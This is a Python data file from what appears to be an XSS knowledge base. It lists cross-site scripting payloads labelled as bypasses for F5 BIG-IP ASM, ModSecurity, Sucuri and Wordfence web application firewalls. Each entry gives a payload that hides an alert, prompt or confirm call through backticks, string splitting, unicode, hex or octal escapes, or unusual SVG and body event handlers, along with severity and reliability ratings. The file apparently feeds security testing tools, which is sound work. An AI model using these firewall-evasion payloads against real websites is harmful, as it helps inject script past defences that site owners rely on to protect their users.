#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Complete WAF Bypass Payloads Collection - Part 2
F5 BIG-IP ASM, ModSecurity, Sucuri, and Wordfence bypasses.
"""

from ..models import PayloadEntry


BRS_KB_WAF_COMPLETE_PAYLOADS_PART2 = {
    # ============================================================
    # F5 BIG-IP ASM BYPASSES
    # ============================================================
    "f5-bypass-svg-1": PayloadEntry(
        payload="<svg/onload=prompt`1`>",
        contexts=["html_content", "svg_xss"],
        severity="high",
        cvss_score=7.5,
        description="F5 bypass - prompt backtick",
        tags=["waf", "f5", "bypass"],
        bypasses=["f5_asm"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "f5-bypass-body-1": PayloadEntry(
        payload="<body/onload=confirm`1`>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="F5 bypass - confirm backtick",
        tags=["waf", "f5", "bypass"],
        bypasses=["f5_asm"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "f5-bypass-eval-1": PayloadEntry(
        payload='<img src=x onerror=window["ale"+"rt"](1)>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="F5 bypass - window bracket notation",
        tags=["waf", "f5", "bypass"],
        bypasses=["f5_asm"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # MODSECURITY ADVANCED BYPASSES
    # ============================================================
    "modsec-bypass-comment-1": PayloadEntry(
        payload='<img src=x onerror="/**/alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="ModSecurity bypass - JS comment",
        tags=["waf", "modsecurity", "bypass"],
        bypasses=["modsecurity"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "modsec-bypass-unicode-1": PayloadEntry(
        payload="<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="ModSecurity bypass - unicode escape",
        tags=["waf", "modsecurity", "bypass", "unicode"],
        bypasses=["modsecurity"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "modsec-bypass-hex-1": PayloadEntry(
        payload="<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="ModSecurity bypass - hex escape",
        tags=["waf", "modsecurity", "bypass", "hex"],
        bypasses=["modsecurity"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "modsec-bypass-octal-1": PayloadEntry(
        payload="<img src=x onerror=\\141\\154\\145\\162\\164(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="ModSecurity bypass - octal escape",
        tags=["waf", "modsecurity", "bypass", "octal"],
        bypasses=["modsecurity"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # SUCURI BYPASSES
    # ============================================================
    "sucuri-bypass-svg-1": PayloadEntry(
        payload='<svg><set onbegin="alert(1)">',
        contexts=["html_content", "svg_xss"],
        severity="high",
        cvss_score=7.5,
        description="Sucuri bypass - SVG set",
        tags=["waf", "sucuri", "bypass", "svg"],
        bypasses=["sucuri"],
        waf_evasion=True,
        browser_support=["chrome", "firefox"],
        reliability="high",
    ),
    "sucuri-bypass-body-1": PayloadEntry(
        payload='<body onafterprint="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Sucuri bypass - onafterprint",
        tags=["waf", "sucuri", "bypass"],
        bypasses=["sucuri"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # WORDFENCE BYPASSES
    # ============================================================
    "wordfence-bypass-svg-1": PayloadEntry(
        payload="<svg/onload=top.alert(1)>",
        contexts=["html_content", "svg_xss"],
        severity="high",
        cvss_score=7.5,
        description="Wordfence bypass - top.alert",
        tags=["waf", "wordfence", "bypass"],
        bypasses=["wordfence"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "wordfence-bypass-self-1": PayloadEntry(
        payload="<img src=x onerror=self.alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Wordfence bypass - self.alert",
        tags=["waf", "wordfence", "bypass"],
        bypasses=["wordfence"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "wordfence-bypass-parent-1": PayloadEntry(
        payload="<img src=x onerror=parent.alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Wordfence bypass - parent.alert",
        tags=["waf", "wordfence", "bypass"],
        bypasses=["wordfence"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
}
